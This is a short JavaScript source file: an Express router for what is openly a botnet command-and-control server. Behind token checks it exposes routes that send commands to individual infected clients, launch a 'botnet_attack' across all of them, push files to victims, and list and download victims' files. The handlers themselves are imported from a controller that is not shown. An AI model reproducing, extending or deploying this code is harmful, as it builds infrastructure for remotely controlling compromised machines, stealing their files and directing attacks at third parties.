
import { Router } from "express"; 
import  { send_cmd, upload_file, getFiles, downloadFiles, botnet_attack }  from "../controllers/c2c_controller.mjs";
import multer from "multer";
import { validate_jwt } from "../middlewares/validate_jwt.mjs";


const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const cmd_router = (clients, attacks_running) => {
    const router = Router();

    router.use(validate_jwt);
    
    router.post('/:id', (req,res) => send_cmd(clients,req,res));
    router.post('/cpanel/all', (req,res) => botnet_attack(clients,attacks_running,req,res));
    router.post('/upload/:id', upload.single("file"), (req,res) => upload_file(clients,req,res));
    router.get('/get_files/:id', (req,res) => getFiles(clients,req,res));
    router.get('/download/:id', (req,res) => downloadFiles(clients,req,res));

    return router;
};

export default cmd_router

